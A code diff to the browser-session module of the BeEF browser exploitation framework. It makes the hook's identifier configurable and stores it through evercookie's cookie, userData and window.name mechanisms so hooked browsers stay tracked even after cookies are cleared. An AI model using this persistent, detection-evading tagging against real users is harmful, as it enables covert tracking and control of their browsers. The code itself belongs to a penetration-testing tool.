@@ -13,7 +13,8 @@ beef.session = {
 	
 	hook_session_id_length: 80,
 	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
-	ec: new evercookie(),	
+	ec: new evercookie(),
+    beefhook: "<%= @hook_session_name %>",
 	
 	/**
 	 * Gets a string which will be used to identify the hooked browser session
@@ -22,12 +23,12 @@ beef.session = {
 	 */
   	get_hook_session_id: function() {
 		// check if the browser is already known to the framework
-		var id = this.ec.evercookie_cookie("BEEFHOOK");
+		var id = this.ec.evercookie_cookie(beef.session.beefhook);
 		if (typeof id == 'undefined') {
-			var id = this.ec.evercookie_userdata("BEEFHOOK");
+			var id = this.ec.evercookie_userdata(beef.session.beefhook);
 		}
 		if (typeof id == 'undefined') {
-			var id = this.ec.evercookie_window("BEEFHOOK");
+			var id = this.ec.evercookie_window(beef.session.beefhook);
 		}
 		
 		// if the browser is not known create a hook session id and set it
@@ -47,9 +48,9 @@ beef.session = {
 	 */
   	set_hook_session_id: function(id) {
 		// persist the hook session id
-		this.ec.evercookie_cookie("BEEFHOOK", id);
-		this.ec.evercookie_userdata("BEEFHOOK", id);
-		this.ec.evercookie_window("BEEFHOOK", id);
+		this.ec.evercookie_cookie(beef.session.beefhook, id);
+		this.ec.evercookie_userdata(beef.session.beefhook, id);
+		this.ec.evercookie_window(beef.session.beefhook, id);
 	},
 	
 	/**
